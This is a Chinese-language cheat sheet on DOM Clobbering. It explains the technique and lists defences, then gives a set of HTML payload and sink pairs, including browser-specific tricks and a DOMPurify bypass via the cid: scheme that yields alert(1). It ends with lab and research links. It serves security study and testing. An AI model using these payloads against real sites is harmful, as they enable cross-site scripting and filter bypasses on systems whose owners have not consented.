# DOM 污染(DOM Clobbering)

> DOM 污染(DOM Clobbering)是一种前端安全漏洞，攻击者通过向页面中注入具有特定ID或name属性的HTML元素，从而覆盖或"污染"JavaScript全局命名空间中的变量。这种技术利用了浏览器将DOM元素自动暴露为全局变量的特性，可能导致应用程序逻辑被篡改、安全机制被绕过，甚至引发跨站脚本(XSS)等更严重的安全问题。

## 什么是DOM Clobbering？

DOM Clobbering（DOM污染）是一种攻击技术，它利用了浏览器将DOM元素的ID和name属性自动暴露为全局变量的特性。当HTML文档中存在具有特定ID或name属性的元素时，浏览器会将这些元素作为全局变量提供给JavaScript环境。攻击者可以利用这一特性，通过注入恶意HTML来覆盖或"污染"现有的JavaScript变量或函数，从而改变应用程序的预期行为。

### 基本工作原理

1. **全局命名空间污染**：浏览器会自动将带有ID或name属性的HTML元素添加到全局`window`对象中。
2. **变量覆盖**：如果注入的HTML元素的ID或name与现有的JavaScript变量或函数名相同，它会覆盖原有的值。
3. **类型转换**：当DOM元素被当作JavaScript对象使用时，会进行隐式类型转换，可能导致意外的行为。
4. **安全边界突破**：通过精心构造的DOM元素，攻击者可能绕过内容安全策略(CSP)或其他安全机制。

### 安全影响

- **XSS攻击**：可能导致跨站脚本攻击，特别是与不安全的动态脚本执行结合时。
- **逻辑漏洞**：可能改变应用程序的业务逻辑，导致权限提升或其他非预期行为。
- **CSP绕过**：某些情况下可用于绕过内容安全策略(CSP)的限制。
- **数据泄露**：可能被用来泄露敏感信息或执行未授权的操作。

### 防御措施

1. 使用`Content-Security-Policy`头部的`'unsafe-hashes'`和`'strict-dynamic'`指令
2. 避免将不受信任的数据直接写入DOM
3. 使用`textContent`而不是`innerHTML`来插入内容
4. 实施严格的输入验证和输出编码
5. 使用现代框架的内置XSS防护机制
6. 考虑使用Trusted Types API来防止基于DOM的XSS

## 目录

- [工具](#工具)
- [方法学](#方法学)
- [实验](#实验)
- [技巧](#技巧)
- [参考资料](#参考资料)

## 工具

- [SoheilKhodayari/DOMClobbering](https://domclob.xyz/domc_markups/list) - 移动和桌面网页浏览器的全面DOM污染Payload列表
- [yeswehack/Dom-Explorer](https://github.com/yeswehack/Dom-Explorer) - 一个用于测试各种HTML解析器和清理器的基于Web的工具
- [yeswehack/Dom-Explorer Live](https://yeswehack.github.io/Dom-Explorer/dom-explorer#eyJpbnB1dCI6IiIsInBpcGVsaW5lcyI6W3siaWQiOiJ0ZGpvZjYwNSIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJhYjU1anN2YyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==) - 揭示浏览器如何解析HTML并发现变异的XSS漏洞

## 方法学

利用需要页面中存在任何类型的`HTML注入`。

- 污染 `x.y.value`

    ```html
    // Payload
    <form id=x><output id=y>我被污染了</output>

    // 接收点
    <script>alert(x.y.value);</script>
    ```

- 使用ID和name属性形成DOM集合来污染`x.y`

    ```html
    // Payload
    <a id=x><a id=x name=y href="被污染的值">

    // 接收点
    <script>alert(x.y)</script>
    ```

- 污染 `x.y.z` - 3级深度

    ```html
    // Payload
    <form id=x name=y><input id=z></form>
    <form id=x></form>

    // 接收点
    <script>alert(x.y.z)</script>
    ```

- 污染 `a.b.c.d` - 超过3级

    ```html
    // Payload
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:被污染的值>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>

    // 接收点
    <script>alert(a.b.c.d)</script>
    ```

- 污染 `forEach` (仅限Chrome)

    ```html
    // Payload
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>

    // 接收点
    <script>x.y.forEach(element=>alert(element))</script>
    ```

- 使用具有相同`id`属性的`<html>`或`<body>`标签污染`document.getElementById()`

    ```html
    // Payloads
    <html id="cdnDomain">被污染的值</html>
    <svg><body id=cdnDomain>被污染的值</body></svg>

    // 接收点
    <script>
    alert(document.getElementById('cdnDomain').innerText);//被污染的值
    </script>
    ```

- 污染 `x.username`

    ```html
    // Payload
    <a id=x href="ftp:被污染的用户名:被污染的密码@a">

    // 接收点
    <script>
    alert(x.username)//被污染的用户名
    alert(x.password)//被污染的密码
    </script>
    ```

- 污染 (仅限Firefox)

    ```html
    // Payload
    <base href=a:abc><a id=x href="Firefox<>">

    // 接收点
    <script>
    alert(x)//Firefox<>
    </script>
    ```

- 污染 (仅限Chrome)

    ```html
    // Payload
    <base href="a://被污染的值<>"><a id=x name=x><a id=x name=xyz href=123>

    // 接收点
    <script>
    alert(x.xyz)//a://被污染的值<>
    </script>
    ```

## 技巧

- DomPurify允许`cid:`协议，它不会编码双引号(`"`): 
  ```html
  <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
  ```

## 实验

- [PortSwigger - 利用DOM污染实现XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
- [PortSwigger - 污染DOM属性以绕过HTML过滤器](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
- [PortSwigger - 受CSP保护的DOM污染测试用例](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)

## 参考资料

- [通过DOM污染绕过CSP - Gareth Heyes - 2023年6月5日](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [DOM污染 - HackTricks - 2023年1月27日](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
- [DOM污染 - PortSwigger - 2020年9月25日](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM污染反击 - Gareth Heyes - 2020年2月6日](https://portswigger.net/research/dom-clobbering-strikes-back)
- [通过DOM污染劫持Service Workers - Gareth Heyes - 2022年11月29日](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
